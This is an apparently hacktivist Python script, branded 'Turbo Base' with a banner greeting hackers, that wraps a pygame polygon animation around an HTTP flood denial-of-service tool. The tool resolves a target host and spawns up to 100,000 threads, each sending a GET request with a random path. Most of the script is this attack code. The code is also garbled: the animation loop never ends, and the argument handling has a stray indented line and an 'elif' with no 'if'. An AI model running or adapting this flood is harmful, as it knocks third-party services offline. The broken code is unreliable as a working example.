# -*-import pygame
import sys
import math
from colorama import Fore, Style, init
import os
import time
import requests
import random
import string
import threading
import socket


# Inisialisasi colorama
init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def typewriter(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_banner():
    clear()
    banner = """ >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> 
    |||||||||| ||     ||  ||||||||  ||||||||  ||||||| 
    |   ||     ||     ||  ||    ||  ||    ||  ||   || 
    |   ||     ||     ||  ||||||||  ||||||||  ||   ||
    |   ||     |||___|||  ||    ||  ||    ||  ||   ||
    |   ||     |||||||||  ||    ||  ||||||||  |||||||
    |>>>>>>>>>>>>>>>>> By Twin Lion <<<<<<<<<<<<<<<<< """
   
    print(Fore.GREEN + banner)
    typewriter(Fore.YELLOW + "TURBO BASE")
    print("Coded By : Twin Lion")
    print("Author : T34m BaSe_Nai")
    print("Github : github.com/Twinlion24434")
    print("Welcome Pejuang BRIGADE AL ASQA BASE_ NAI")
    print("Note- Greetings All Hackers Let's Take Part in the Struggle in the Humanitarian Mission to Defend Palestine")

print_banner()
time.sleep(5)  # Tunggu 5 detik sebelum memulai animasi

# Inisialisasi Pygame
pygame.init()

# Set ukuran layar
lebar, tinggi = 640, 480
layar = pygame.display.set_mode((lebar, tinggi))

# Set judul jendela
pygame.display.set_caption("Animasi Poligon")

# Set warna
putih = (255, 255, 255)
merah = (255, 0, 0)

# Fungsi untuk menggambar poligon
def gambar_poligon(sudut, x, y, radius):
    points = []
    for i in range(sudut):
        angle = 2 * math.pi * i / sudut
        px = x + radius * math.cos(angle)
        py = y + radius * math.sin(angle)
        points.append((px, py))
    return points

# Variabel untuk animasi
sudut = 3
radius = 100
x, y = lebar // 2, tinggi // 2

# Loop utama
while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()

    layar.fill(putih)
    points = gambar_poligon(sudut, x, y, radius)
    pygame.draw.polygon(layar, merah, points, 2)
    sudut += 1
    if sudut > 10:
        sudut = 3

    pygame.display.flip()
    pygame.time.Clock().tick(60)

port_pilihan = input("Masukkan port (80 untuk HTTP, 443 untuk HTTPS): ")
port = int(port_pilihan)
    num_requests = 100000 # Pastikan tidak ada spasi/tab sebelum kode ini
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print (f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
    sys.exit(1)

# Ubah FQDN ke IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print (" ERROR\n Make sure you entered a correct website")
    sys.exit(2)

# Buat variabel bersama untuk jumlah utas
thread_num = 0
thread_num_mutex = threading.Lock()


# print status utas
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    #print output pada baris yang sama
    ph_value = str(slice)
    orp_value = str(slice)
    sys.stdout.write(f"{time.ctime().split()[3]} [{str(thread_num)}]")
    print(f" \033[92mTurbo_Base  \033[97mSent packet\033[33m  [\033[32m"+ip+"\033[33m]\033[0m" )
    sys.stdout.write(f"{time.ctime().split()[3]} [{str(thread_num)}]")
    print(f" \033[32mTurbo_Base  \033[33mSent packet\033[97m  [\033[35m"+ip+"\033[97m]\033[0m" )
    sys.stdout.write(f"{time.ctime().split()[3]} [{str(thread_num)}]")
    print(f" \033[37mTurbo_Base  \033[96mSent packet\033[95m  [\033[93m"+ip+"\033[93m]\033[0m" )
    thread_num_mutex.release()
    
# Hasilkan Jalur URL
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Lakukan permintaan
def attack():
    print_status()
    url_path = generate_url_path()

    # Buat soket mentah
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Buka koneksi pada soket mentah tsb
        dos.connect((ip, port))

        # Kirim permintaan sesuai spesifikasi HTTP
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print (f" [ No connection, server may be down ]: {str(socket.error)}")
    finally:
        # Tutup soket dengan rapi
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print (f"Sent massage Turbo_Base Team{1 + 1}")

# Memunculkan thread per permintaan
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()  # Jadikan thread utama menunggu cabang thread
